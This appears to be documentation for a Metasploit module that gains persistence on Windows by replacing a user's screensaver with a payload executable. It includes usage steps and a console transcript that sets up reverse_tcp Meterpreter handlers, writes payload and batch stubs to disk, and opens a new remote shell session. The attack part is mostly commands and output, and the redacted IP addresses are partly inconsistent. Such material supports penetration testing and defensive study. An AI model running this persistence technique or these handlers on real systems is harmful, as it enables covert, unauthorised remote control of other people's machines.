## Vulnerable Application

  This module sets a user's screensaver to a payload executable file, saved as a `.scr` file.
  The persistence technique has been documented in MITRE's ATT&CK's technique list.

  Of note, a single .exe (renamed as .scr) can be set in the registry with no parameters.
  To achieve this vector, we use a `windows/exec` payload stub to run a `.bat` file.
  The `.bat` file then runs the true payload, and then the original screensaver.  A `/s`
  flag is required to run the screensaver, as opposed to flagless which will show the options
  for it.

  An attempt to force the screensaver change to be recognized without a reboot,
  however (as mentioned on posts on the Internet) this doesn't seem to be reliable
  (which was verified in testing), and one solution seems to be just running it lots of times,
  so we try ten times.  There's also no feedback to tell if it was a success or not.

  The payload will also execute when the screensaver settings menu is opened, or preview
  button is hit.

  Prior to Sept 4, 2019 Mitre's ATT&CK page had previously reported `ScreenSaveTimeOut`
  incorrectly as `ScreenSaverTimeOut` (R).

## Verification Steps

  1. Start msfconsole
  2. Get a shell on the system (SYSTEM will result in the logged in user)
  3. Do: ```use windows/local/user_screensaver_persistence```
  4. Do: ```set writabledir```
  5. Do: ```run```
  6. Create a ```exploit/multi/handler``` with the correct payload and options
  7. Wait
  8. You should get a user level shell

## Options

  **SCREENSAVERTIMEOUT**

  How long to wait until the Screen Saver is activated in seconds.  Default is `0` which means don't alter the value.

  **SCREENSAVER**

  Name of the screensaver .scr file.  Default is `` which will randomly generate.

  **WritableDir**

  A folder which the user can write to.  Default is for Windows 7+ `C:\ProgramData\`

## Scenarios

### Windows 2012

#### Handlers and Initial Access

Create listeners for initial user access (5555) and screensaver shell (4444)

  ```
  resource (screensaver.rb)> use exploit/multi/handler
  resource (screensaver.rb)> set payload windows/meterpreter/reverse_tcp
  payload => windows/meterpreter/reverse_tcp
  resource (screensaver.rb)> set lport 4444
  lport => 4444
  resource (screensaver.rb)> set lhost 111.111.1.111
  lhost => 192.168.2.193
  resource (screensaver.rb)> set ExitOnSession false
  ExitOnSession => false
  resource (screensaver.rb)> run -j
  [*] Exploit running as background job 0.
  [*] Exploit completed, but no session was created.
  resource (screensaver.rb)> set lport 5555
  lport => 5555
  resource (screensaver.rb)> run -j
  [*] Started reverse TCP handler on 192.168.2.193:4444 
  [*] Exploit running as background job 1.
  [*] Exploit completed, but no session was created.
  msf5 exploit(windows/local/user_screensaver_persistence) > jobs
  
  Jobs
  ====
  
    Id  Name                    Payload                          Payload opts
    --  ----                    -------                          ------------
    0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://111.111.1.111:4444
    1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://111.111.1.111:5555

  msf5 exploit(windows/local/user_screensaver_persistence) > 
  [*] Sending stage (179779 bytes) to 222.222.2.222
  [*] Meterpreter session 1 opened (111.111.1.111:5555 -> 222.222.2.222:49159) at 2019-09-05 21:12:38 -0400
  ```

#### Set Screensaver

  ```
  resource (screensaver.rb)> use exploit/windows/local/user_screensaver_persistence
  [*] Started reverse TCP handler on 111.111.1.111:5555 
  resource (screensaver.rb)> set session 1
  session => 1
  resource (screensaver.rb)> set screensavetimeout 60
  screensavetimeout => 60
  msf5 exploit(windows/local/user_screensaver_persistence) > run
  
  [*] Original SCRNSAVE.EXE value: C:\Windows\system32\scrnsave.scr
  [*] Original ScreenSaveActive value: 1
  [+] Script to revert changes:
  reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d C:\Windows\system32\scrnsave.scr /f
  reg.exe delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeOut /f
  reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
  [*] Writing payload to C:\ProgramData\hLDnEAAyp.exe
  [*] Writing stub to C:\ProgramData\dYyw9.bat
  [*] Writing scr stub to C:\ProgramData\Og29l.scr
  [*] Changing screensaver
  [+] Screensaver set!
  msf5 exploit(windows/local/user_screensaver_persistence) > date
  [*] exec: date

  Thu 05 Sep 2019 09:13:11 PM EDT
  msf5 exploit(windows/local/user_screensaver_persistence) > 
  [*] Sending stage (179779 bytes) to 222.222.2.222
  [*] Meterpreter session 2 opened (111.111.1.111:4444 -> 222.222.2.222:49160) at 2019-09-05 21:14:30 -0400
  ```
